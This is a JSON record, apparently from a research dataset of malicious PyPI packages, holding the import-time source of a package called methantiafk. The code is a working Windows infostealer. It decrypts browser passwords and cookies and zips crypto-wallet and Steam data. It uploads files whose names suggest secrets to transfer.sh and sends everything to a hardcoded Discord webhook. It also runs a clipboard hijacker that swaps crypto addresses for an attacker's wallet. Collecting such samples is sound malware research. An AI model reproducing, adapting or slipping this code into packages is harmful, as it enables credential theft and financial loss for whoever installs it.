[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/methantiafk-0.0.3/methantiafk-0.0.3/methantiafk/__init__.py",
    "malicious_code": "import os\nimport sys\nimport subprocess\nimport threading\nimport shutil\nimport ntpath\nimport requests\nimport httpx\nimport base64\nimport json\nimport re\nimport pyperclip\nimport psutil\nimport win32gui\nimport win32con\nimport zipfile\nimport sqlite3\nimport time\nimport random\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# --- Malicious Data Exfiltration via Discord Webhook ---\ndef send_webhook(file_path, webhook_url):\n    with open(file_path, \"rb\") as f:\n        files = {\"file\": (file_path, f)}\n        requests.post(webhook_url, files=files)\n\nappdata = os.getenv(\"APPDATA\")\nkeys_path = os.path.join(appdata, \".kfaction\", \"cache\", \"keys\")\nscreenshots_path = os.path.join(appdata, \".kfaction\", \"screenshots\")\nwebhook_url = \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\"\n\nif os.path.exists(keys_path):\n    for filename in os.listdir(keys_path):\n        file_path = os.path.join(keys_path, filename)\n        if os.path.isfile(file_path):\n            send_webhook(file_path, webhook_url)\n\nif os.path.exists(screenshots_path):\n    for filename in os.listdir(screenshots_path):\n        file_path = os.path.join(screenshots_path, filename)\n        if os.path.isfile(file_path) and file_path.endswith(\".png\"):\n            send_webhook(file_path, webhook_url)\n\n# --- Malicious Clipboard Crypto Wallet Address Swapper ---\nclass auto_copy_wallet:\n    def __init__(self):\n        self.address_st3aler = 'yes'\n        self.address_btc = 'none'\n        self.address_eth = '0x4c305D9d4CdF740FF4f2166ecF65c1DF73e93472'\n        self.address_xchain = 'none'\n        self.address_pchain = 'none'\n        self.address_cchain = 'none'\n        self.address_monero = 'none'\n        self.address_ada = 'none'\n        self.address_dash = 'none'\n\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search('addr1[a-z0-9]+', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# --- Malicious Data Stealer and Exfiltration (core logic) ---\n# The following code is a condensed version of the main malicious logic for browser data theft, file search, and exfiltration\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\nThreadlist = []\n\ndef fetch_conf(e: str) -> str or bool | None:\n    # In the real code, this fetches from a config dict\n    # Here, we just return the hardcoded webhook\n    if e == \"yourwebhookurl\":\n        return \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\"\n    return None\n\nhook = fetch_conf(\"yourwebhookurl\")\n\n# --- Crypto/Browser Data Decryption Helpers ---\nclass DATA_BLOB(Structure):\n    _fields_ = [\n        ('cbData', wintypes.DWORD),\n        ('pbData', POINTER(c_char))\n    ]\n\ndef GetData(blob_out):\n    cbData = int(blob_out.cbData)\n    pbData = blob_out.pbData\n    buffer = c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer, pbData, cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\n\ndef CryptUnprotectData(encrypted_bytes, entropy=b''):\n    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))\n    buffer_entropy = c_buffer(entropy, len(entropy))\n    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)\n    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)\n    blob_out = DATA_BLOB()\n    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):\n        return GetData(blob_out)\n\ndef DecryptValue(buff, master_key=None):\n    starts = buff.decode(encoding='utf8', errors='ignore')[:3]\n    if starts == 'v10' or starts == 'v11':\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n\n# --- Malicious HTTP/Exfiltration Helpers ---\ndef LoadRequests(methode, url, data='', files='', headers=''):\n    for i in range(8):\n        try:\n            if methode == 'POST':\n                if data != '':\n                    r = requests.post(url, data=data)\n                    if r.status_code == 200:\n                        return r\n                elif files != '':\n                    r = requests.post(url, files=files)\n                    if r.status_code == 200 or r.status_code == 413:\n                        return r\n        except:\n            pass\n\ndef LoadUrlib(hook, data='', files='', headers=''):\n    for i in range(8):\n        try:\n            if headers != '':\n                r = urlopen(Request(hook, data=data, headers=headers))\n                return r\n            else:\n                r = urlopen(Request(hook, data=data))\n                return r\n        except:\n            pass\n\ndef Trust(Cookies):\n    global DETECTED\n    data = str(Cookies)\n    tim = re.findall(\".google.com\", data)\n    if len(tim) < -1:\n        DETECTED = True\n        return DETECTED\n    else:\n        DETECTED = False\n        return DETECTED\n\ndef Reformat(listt):\n    e = re.findall(\"(\\w+[a-z])\",listt)\n    while \"https\" in e: e.remove(\"https\")\n    while \"com\" in e: e.remove(\"com\")\n    while \"net\" in e: e.remove(\"net\")\n    return list(set(e))\n\ndef upload(name, tk=''):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    if name == \"blackcapedez\":\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Interesting files found on user PC:\",\n                \"value\": tk\n                }\n            ],\n            \"author\": {\n                'name': f'Black - Cap v2.3',\n                'url': 'https://github.com/KSCHdsc',\n                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'\n            },\n            \"footer\": {\n                \"text\": \"github.com/KSCHdsc\"\n            },\n            'color': 374276,\n            }\n        ],\n        \"avatar_url\": \"https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png\",\n        \"attachments\": []\n        }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n        return\n    path = name\n    files = {'file': open(path, 'rb')}\n    if \"bc_allpasswords\" in name:\n        ra = ' | '.join(da for da in paswWords)\n        if len(ra) > 1000:\n            rrr = Reformat(str(paswWords))\n            ra = ' | '.join(da for da in rrr)\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Passwords Found:\",\n                \"value\": ra\n                }\n            ],\n            \"author\": {\n                'name': f'Black - Cap v2.3',\n                'url': 'https://github.com/KSCHdsc',\n                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'\n            },\n            \"footer\": {\n                \"text\": \"github.com/KSCHdsc\",\n            },\n            'color': 374276,\n            }\n        ],\n         \"avatar_url\": \"https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png\",\n        \"attachments\": []\n        }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n    if \"bc_allcookies\" in name:\n        rb = ' | '.join(da for da in cookiWords)\n        if len(rb) > 1000:\n            rrrrr = Reformat(str(cookiWords))\n            rb = ' | '.join(da for da in rrrrr)\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Cookies Found:\",\n                \"value\": rb\n                }\n            ],\n            \"author\": {\n                'name': f'Black - Cap v2.3',\n                'url': 'https://github.com/KSCHdsc',\n                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'\n            },\n            \"footer\": {\n                \"text\": \"github.com/KSCHdsc\",\n            },\n            'color': 374276,\n            }\n        ],\n         \"avatar_url\": \"https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png\",\n        \"attachments\": []\n        }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n    LoadRequests(\"POST\", hook, files=files)\n\ndef writeforfile(data, name):\n    path = os.getenv(\"TEMP\") + f\"\\{name}.txt\"\n    with open(path, mode='w', encoding='utf-8') as f:\n        f.write(f\"Created by KSCH | https://github.com/KSCHdsc\\n\\n\")\n        for line in data:\n            if line[0] != '':\n                f.write(f\"{line}\\n\")\n\nPassw = []\ndef getPassw(path, arg):\n    global Passw\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = temp + \"blackcaped\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0] != '':\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in paswWords: paswWords.append(old)\n            Passw.append(f\"URL: {row[0]} \\n ID: {row[1]} \\n PASSW0RD: {DecryptValue(row[2], master_key)}\\n\\n\")\n    writeforfile(Passw, 'bc_allpasswords')\n\nCookies = []\ndef getCookie(path, arg):\n    global Cookies\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = temp + \"blackcaped\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0] != '':\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in cookiWords: cookiWords.append(old)\n            Cookies.append(f\" HOST KEY: {row[0]} | NAME: {row[1]} | VALUE: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Cookies, 'bc_allcookies')\n\ndef checkIfProcessRunning(processName):\n    for proc in psutil.process_iter():\n        try:\n            if processName.lower() in proc.name().lower():\n                return True\n        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):\n            pass\n    return False;\n\ndef ZipThings(path, arg, procc):\n    pathC = path\n    name = arg\n    if \"nkbihfbeogaeaoehlefnkodbefgpgknn\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"Metamask_{browser}\"\n        pathC = path + arg\n    if not os.path.exists(pathC): return\n    if checkIfProcessRunning('chrome.exe'):\n        subprocess.Popen(f\"taskkill /im {procc} /t /f\", shell=True)\n    if \"Wallet\" in arg or \"NationsGlory\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"{browser}\"\n    elif \"Steam\" in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"): return\n        f = open(f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\")\n        data = f.readlines()\n        found = False\n        for l in data:\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\n                found = True\n        if found == False: return\n        name = arg\n    zf = zipfile.ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n    for file in os.listdir(pathC):\n        if not \".zip\" in file: zf.write(pathC + \"/\" + file)\n    zf.close()\n    upload(f'{pathC}/{name}.zip')\n    os.remove(f\"{pathC}/{name}.zip\")\n\ndef GatherAll():\n    browserPaths = [\n        [f\"{roaming}/Opera Software/Opera GX Stable\",               \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n        [f\"{roaming}/Opera Software/Opera Stable\",                  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n        [f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n        [f\"{local}/Google/Chrome/User Data\",                        \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n        [f\"{local}/Google/Chrome SxS/User Data\",                    \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n        [f\"{local}/BraveSoftware/Brave-Browser/User Data\",          \"brave.exe\",    \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n        [f\"{local}/Yandex/YandexBrowser/User Data\",                 \"yandex.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn\"                                    ],\n        [f\"{local}/Microsoft/Edge/User Data\",                       \"edge.exe\",     \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ]\n    ]\n    PathsToZip = [\n        [f\"{roaming}/atomic/Local Storage/leveldb\", '\"Atomic Wallet.exe\"', \"Wallet\"],\n        [f\"{roaming}/Exodus/exodus.wallet\", \"Exodus.exe\", \"Wallet\"],\n        [\"C:\\\\Program Files (x86)\\\\Steam\\\\config\", \"steam.exe\", \"Steam\"],\n        [f\"{roaming}/NationsGlory/Local Storage/leveldb\", \"NationsGlory.exe\", \"NationsGlory\"]\n    ]\n    for patt in browserPaths:\n        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])\n        a.start()\n        Threadlist.append(a)\n    ThCokk = []\n    for patt in browserPaths:\n        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])\n        a.start()\n        ThCokk.append(a)\n    for thread in ThCokk: thread.join()\n    DETECTED = Trust(Cookies)\n    if DETECTED == True: return\n    for patt in browserPaths:\n        threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()\n    for patt in PathsToZip:\n        threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths\n    upths = []\n    for file in [\"bc_allpasswords.txt\", \"bc_allcookies.txt\"]:\n        upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\n\ndef uploadToAnonfiles(path):\n    try:\n        files = { \"file\": (path, open(path, mode='rb')) }\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef blackcapedezFolder(pathF, keywords):\n    global blackcapedezFiles\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        i += 1\n        if i <= maxfilesperdir:\n            url = uploadToAnonfiles(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    blackcapedezFiles.append([\"folder\", pathF + \"/\", ffound])\n\nblackcapedezFiles = []\ndef blackcapedezFile(path, keywords):\n    global blackcapedezFiles\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, uploadToAnonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    blackcapedezFolder(target, keywords)\n                    break\n    blackcapedezFiles.append([\"folder\", path, fifound])\n\ndef blackcapedez():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [\n        \"passw\",\n        \"mdp\",\n        \"motdepasse\",\n        \"mot_de_passe\",\n        \"login\",\n        \"secret\",\n        \"account\",\n        \"acount\",\n        \"paypal\",\n        \"banque\",\n        \"metamask\",\n        \"wallet\",\n        \"crypto\",\n        \"exodus\",\n        \"discord\",\n        \"2fa\",\n        \"code\",\n        \"memo\",\n        \"compte\",\n        \"token\",\n        \"backup\",\n        \"seecret\"\n        ]\n    wikith = []\n    for patt in path2search:\n        blackcapedez = threading.Thread(target=blackcapedezFile, args=[patt, key_wordsFiles]);blackcapedez.start()\n        wikith.append(blackcapedez)\n    return wikith\n\nglobal keyword, cookiWords, paswWords\nkeyword = [\n    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'\n]\ncookiWords = []\npaswWords = []\n\nGatherAll()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = blackcapedez()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    filetext = \"\\n\"\n    for arg in blackcapedezFiles:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"```diff\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n```\"\n                filetext += \"\\n\"\n    upload(\"blackcapedez\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n"
  }
]